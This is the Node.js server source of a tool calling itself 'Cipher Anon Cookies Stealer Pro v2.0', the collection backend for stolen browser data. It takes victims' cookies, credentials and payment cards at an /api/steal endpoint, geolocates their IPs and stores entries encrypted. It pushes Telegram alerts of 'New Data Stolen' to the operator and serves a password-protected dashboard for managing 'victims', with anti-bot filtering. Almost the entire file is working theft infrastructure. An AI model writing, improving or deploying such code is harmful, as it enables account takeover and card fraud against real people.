// ============================================================
// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
// FIXED: Routes order (API before static)
// ============================================================

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const session = require('express-session');

// Import Anti-Bot
const { antiBot, handleVerify } = require('./anti-bot.js');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG_FILE = path.join(__dirname, 'config.json');

function generateValidKey() {
    return crypto.randomBytes(32).toString('hex');
}

function loadConfig() {
    const envConfig = {
        DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
        DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
        ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || generateValidKey(),
        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
        TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
        SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
    };

    let fileConfig = {};
    if (fs.existsSync(CONFIG_FILE)) {
        try {
            fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
        } catch (e) {}
    }

    const merged = { ...fileConfig, ...envConfig };
    const key = merged.ENCRYPTION_KEY;
    if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
        merged.ENCRYPTION_KEY = generateValidKey();
    }

    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
    } catch (e) {}

    return merged;
}

const CONFIG = loadConfig();

console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);

// ============================================================
// DATA FILES
// ============================================================

const DATA_FILE = path.join(__dirname, 'stolen.enc');
const TRASH_FILE = path.join(__dirname, 'trash.enc');
const LOG_FILE = path.join(__dirname, 'steal.log');

// ============================================================
// SESSION SETUP
// ============================================================

const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MAX_AGE = 30 * 60 * 1000;

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        maxAge: SESSION_MAX_AGE,
        httpOnly: true,
        sameSite: 'lax'
    }
}));

// Session activity check
app.use((req, res, next) => {
    if (req.session && req.session.authenticated) {
        const now = Date.now();
        const lastActivity = req.session.lastActivity || now;
        if (now - lastActivity > SESSION_MAX_AGE) {
            req.session.destroy(() => {
                if (req.path.startsWith('/api')) {
                    return res.status(401).json({ status: 'error', message: 'Session expired' });
                }
                res.redirect('/login.php');
            });
            return;
        }
        req.session.lastActivity = now;
    }
    next();
});

// ============================================================
// ENCRYPTION ENGINE
// ============================================================

function encryptData(data) {
    const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, encrypted]).toString('base64');
}

function decryptData(encryptedBase64) {
    try {
        const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
        const buffer = Buffer.from(encryptedBase64, 'base64');
        const iv = buffer.subarray(0, 16);
        const tag = buffer.subarray(16, 32);
        const encrypted = buffer.subarray(32);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
        return JSON.parse(decrypted.toString());
    } catch (e) {
        return null;
    }
}

function saveData(file, data) {
    fs.writeFileSync(file, encryptData(data));
}

function loadData(file) {
    if (!fs.existsSync(file)) return [];
    try {
        const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
        return decrypted || [];
    } catch (e) {
        return [];
    }
}

let stolenData = loadData(DATA_FILE);
let trashData = loadData(TRASH_FILE);

// ============================================================
// DEDUP
// ============================================================

const dedupCache = new Map();
const DEDUP_WINDOW = 60000;

function cleanDedup() {
    const now = Date.now();
    for (const [key, ts] of dedupCache) {
        if (now - ts > DEDUP_WINDOW) dedupCache.delete(key);
    }
}

function isDuplicate(ip, hostname) {
    let cleanIp = ip;
    if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') cleanIp = '127.0.0.1';
    const key = `${cleanIp}|${hostname}`;
    if (dedupCache.has(key)) {
        const ts = dedupCache.get(key);
        if (Date.now() - ts < DEDUP_WINDOW) return true;
    }
    dedupCache.set(key, Date.now());
    return false;
}

// ============================================================
// LOGGING
// ============================================================

function log(msg) {
    const entry = `[${new Date().toISOString()}] ${msg}`;
    console.log(entry);
    try { fs.appendFileSync(LOG_FILE, entry + '\n'); } catch (e) {}
}

// ============================================================
// AUTH MIDDLEWARE
// ============================================================

function requireAuth(req, res, next) {
    if (req.session && req.session.authenticated === true) {
        return next();
    }
    if (req.path.startsWith('/api')) {
        return res.status(401).json({ status: 'error', message: 'Unauthorized - Please login' });
    }
    res.redirect('/login.php');
}

// ============================================================
// MIDDLEWARE — CORS + JSON + Anti-Bot
// ============================================================

app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Anti-Bot — apply BEFORE routes
app.use(antiBot({
    STRENGTH: 'high',
    RATE_LIMIT_MAX: 10,
    ALLOWED_IPS: []
}));

app.post('/__verify', express.json(), handleVerify);

// ============================================================
// SECURITY HEADERS
// ============================================================

app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

// ============================================================
// API ROUTES — MUST BE DEFINED BEFORE STATIC FILES
// ============================================================

// ---- GEOLOCATION ----
async function getCountryInfo(ip) {
    try {
        const response = await axios.get('http://ip-api.com/json/' + ip, { timeout: 5000 });
        const data = response.data;
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                isp: data.isp,
                lat: data.lat,
                lon: data.lon
            };
        }
        return null;
    } catch (error) {
        log(`[!] Geolocation failed for ${ip}: ${error.message}`);
        return null;
    }
}

// ---- TELEGRAM ----
async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount) {
    if (!CONFIG.SEND_NOTIFICATIONS) return;
    const t = CONFIG.TELEGRAM_BOT_TOKEN;
    const c = CONFIG.TELEGRAM_CHAT_ID;
    if (!t || t === 'YOUR_BOT_TOKEN' || t === '') return;

    const flag = countryInfo?.countryCode ? getFlagEmoji(countryInfo.countryCode) : '🌍';
    const countryName = countryInfo?.country || 'Unknown';
    const city = countryInfo?.city || 'N/A';
    const isp = countryInfo?.isp || 'N/A';
    const time = new Date().toLocaleString();

    let extra = '';
    if (credCount > 0) extra += `\n🔑 *Credentials:* ${credCount}`;
    if (cardCount > 0) extra += `\n💳 *Cards:* ${cardCount}`;

    const message = `🍪 *Cipher Anon — New Data Stolen!*

📍 *Domain:* ${host}
🍪 *Cookies:* ${count}
${extra}
👤 *IP:* ${ip}
${flag} *Country:* ${countryName}
🏙️ *City:* ${city}
📡 *ISP:* ${isp}
🕐 *Time:* ${time}

📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'https://' + (req?.headers?.host || 'localhost:' + PORT)}/dashboard`;

    try {
        await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
            chat_id: c,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 10000 });
        log('[+] Telegram notification sent');
    } catch (e) {
        log(`[!] Telegram failed: ${e.message}`);
    }
}

function getFlagEmoji(countryCode) {
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
}

function generateUniqueId(entry) {
    const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
    const ip = entry.ip || 'unknown';
    const time = entry.receivedAt || new Date().toISOString();
    return crypto.createHash('md5').update(`${time}|${ip}|${domain}`).digest('hex');
}

// ---- LOGIN API ----
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }

    if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
        req.session.authenticated = true;
        req.session.username = username;
        req.session.lastActivity = Date.now();
        req.session.save();
        log(`[+] User logged in: ${username}`);
        return res.json({ status: 'ok', message: 'Login successful' });
    }

    log(`[!] Failed login attempt: ${username}`);
    res.status(401).json({ status: 'error', message: 'Invalid username or password' });
});

// ---- LOGOUT ----
app.get('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) log(`[!] Logout error: ${err.message}`);
        res.clearCookie('connect.sid');
        log('[+] User logged out');
        res.redirect('/login.php');
    });
});

// ---- STEAL COOKIES ----
app.post('/api/steal', async (req, res) => {
    try {
        const data = req.body;
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        if (ip === '::1' || ip === '::ffff:127.0.0.1') {
            ip = '127.0.0.1';
        }

        const countryInfo = await getCountryInfo(ip);

        data.ip = ip;
        data.country = countryInfo?.country || 'Unknown';
        data.countryCode = countryInfo?.countryCode || 'XX';
        data.city = countryInfo?.city || 'N/A';
        data.region = countryInfo?.region || 'N/A';
        data.isp = countryInfo?.isp || 'N/A';
        data.receivedAt = new Date().toISOString();
        data.credentials = data.credentials || [];
        data.cards = data.cards || [];

        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';

        cleanDedup();
        if (isDuplicate(ip, hostname)) {
            log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
            return res.json({ status: 'ok', duplicate: true });
        }

        data._uniqueId = generateUniqueId(data);
        stolenData.push(data);
        saveData(DATA_FILE, stolenData);

        const count = Object.keys(data.cookies || {}).length;
        const credCount = data.credentials.length;
        const cardCount = data.cards.length;

        log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards | ${ip}`);
        
        // Send Telegram (async, don't wait)
        sendTelegram(hostname, count, ip, countryInfo, credCount, cardCount).catch(() => {});

        res.json({ status: 'ok', country: countryInfo });
    } catch (e) {
        log(`[!] Error in /api/steal: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- GET ALL DATA ----
app.get('/api/data', requireAuth, (req, res) => {
    const clean = stolenData.map(({ _dedupKey, ...rest }) => rest);
    res.json(clean);
});

// ---- GET TRASH DATA ----
app.get('/api/trash', requireAuth, (req, res) => {
    const clean = trashData.map(({ _dedupKey, ...rest }) => rest);
    res.json(clean);
});

// ---- MOVE TO TRASH ----
app.delete('/api/delete/:uniqueId', requireAuth, (req, res) => {
    const uid = req.params.uniqueId;
    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
    }
    const index = stolenData.findIndex(entry => entry._uniqueId === uid);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Victim not found' });
    }
    try {
        const removed = stolenData.splice(index, 1)[0];
        removed.deletedAt = new Date().toISOString();
        trashData.push(removed);
        saveData(DATA_FILE, stolenData);
        saveData(TRASH_FILE, trashData);
        log(`[+] Moved to trash: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
        res.json({ status: 'ok', moved: removed });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- RESTORE FROM TRASH ----
app.post('/api/restore/:uniqueId', requireAuth, (req, res) => {
    const uid = req.params.uniqueId;
    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
    }
    const index = trashData.findIndex(entry => entry._uniqueId === uid);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
    }
    try {
        const restored = trashData.splice(index, 1)[0];
        delete restored.deletedAt;
        stolenData.push(restored);
        saveData(DATA_FILE, stolenData);
        saveData(TRASH_FILE, trashData);
        log(`[+] Restored from trash: ${restored?.fingerprint?.hostname || restored?.domain || 'unknown'}`);
        res.json({ status: 'ok', restored: restored });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- PERMANENTLY DELETE ----
app.delete('/api/trash/permanent/:uniqueId', requireAuth, (req, res) => {
    const uid = req.params.uniqueId;
    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
    }
    const index = trashData.findIndex(entry => entry._uniqueId === uid);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
    }
    try {
        const removed = trashData.splice(index, 1)[0];
        saveData(TRASH_FILE, trashData);
        log(`[+] Permanently deleted: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
        res.json({ status: 'ok', permanentlyDeleted: removed });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- EMPTY TRASH ----
app.delete('/api/trash/empty', requireAuth, (req, res) => {
    try {
        const count = trashData.length;
        trashData = [];
        saveData(TRASH_FILE, trashData);
        log(`[+] Emptied trash: ${count} victims`);
        res.json({ status: 'ok', count: count });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- CLEAR ALL DATA ----
app.delete('/api/clear', requireAuth, (req, res) => {
    try {
        stolenData = [];
        saveData(DATA_FILE, stolenData);
        log('[+] All data cleared');
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- CHANGE PASSWORD ----
app.post('/api/change-password', requireAuth, (req, res) => {
    const { oldPassword, newPassword } = req.body;

    if (!oldPassword || !newPassword) {
        return res.status(400).json({ status: 'error', message: 'Old and new password required' });
    }

    if (newPassword.length < 4) {
        return res.status(400).json({ status: 'error', message: 'New password must be at least 4 characters' });
    }

    if (oldPassword !== CONFIG.DASHBOARD_PASSWORD) {
        return res.status(401).json({ status: 'error', message: 'Current password is incorrect' });
    }

    CONFIG.DASHBOARD_PASSWORD = newPassword;
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {}

    log('[+] Password changed successfully');

    req.session.destroy((err) => {
        if (err) log(`[!] Session destroy error: ${err.message}`);
        res.clearCookie('connect.sid');
        res.json({
            status: 'ok',
            message: 'Password updated successfully',
            redirect: '/password-success.php'
        });
    });
});

// ---- GET TELEGRAM CONFIG ----
app.get('/api/config/telegram', requireAuth, (req, res) => {
    res.json({
        botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
        chatId: CONFIG.TELEGRAM_CHAT_ID || '',
        notifications: CONFIG.SEND_NOTIFICATIONS !== undefined ? CONFIG.SEND_NOTIFICATIONS : true
    });
});

// ---- UPDATE TELEGRAM CONFIG ----
app.post('/api/config/telegram', requireAuth, (req, res) => {
    const { botToken, chatId, notifications } = req.body;

    if (!botToken || !chatId) {
        return res.status(400).json({
            status: 'error',
            message: 'Bot token and chat ID are required'
        });
    }

    CONFIG.TELEGRAM_BOT_TOKEN = botToken;
    CONFIG.TELEGRAM_CHAT_ID = chatId;
    CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;

    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {}

    log('[+] Telegram config updated');
    res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
});

// ============================================================
// STATIC FILES — AFTER API ROUTES
// ============================================================

// ---- Serve .php files ----
app.get('*.php', (req, res, next) => {
    const filePath = path.join(__dirname, 'public', req.path);
    if (fs.existsSync(filePath)) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.sendFile(filePath);
    } else {
        const basePath = filePath.replace(/\.php$/, '');
        if (fs.existsSync(basePath)) {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.sendFile(basePath);
        } else {
            next();
        }
    }
});

app.use(express.static('public', {
    index: false,
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.html')) {
            return res.status(404).send('Not Found');
        }
        if (filePath.endsWith('.php')) {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
        }
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    }
}));

// ---- Home ----
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'home.php'));
});

// ---- Login Page ----
app.get('/login.php', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/dashboard');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'login.php'));
});

// ---- Password Success ----
app.get('/password-success.php', (req, res) => {
    if (req.session) {
        req.session.destroy(() => {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
        });
    } else {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
    }
});

// ---- Protected Dashboard ----
app.get('/dashboard', requireAuth, (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
});

// ============================================================
// 404 HANDLER
// ============================================================

app.use((req, res) => {
    if (req.path.startsWith('/api')) {
        res.status(404).json({ status: 'error', message: 'API endpoint not found' });
    } else {
        res.status(404).send('Not Found');
    }
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
    console.log('\n' + '='.repeat(55));
    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
    console.log('='.repeat(55));
    console.log(`  [+] Server: http://localhost:${PORT}`);
    console.log(`  [+] Login: http://localhost:${PORT}/login.php`);
    console.log(`  [+] Home: http://localhost:${PORT}/home.php`);
    console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
    console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
    console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
    console.log(`  [+] Session Timeout: 30 minutes`);
    console.log(`  [+] Dedup: IP + hostname, 60s window`);
    console.log(`  [+] Anti-Bot: ENABLED ✅`);
    console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
    console.log('='.repeat(55) + '\n');
});

// ============================================================
// GRACEFUL SHUTDOWN
// ============================================================

process.on('SIGINT', () => {
    console.log('\n[!] Saving data...');
    saveData(DATA_FILE, stolenData);
    saveData(TRASH_FILE, trashData);
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n[!] Saving data...');
    saveData(DATA_FILE, stolenData);
    saveData(TRASH_FILE, trashData);
    process.exit(0);
});

module.exports = app;
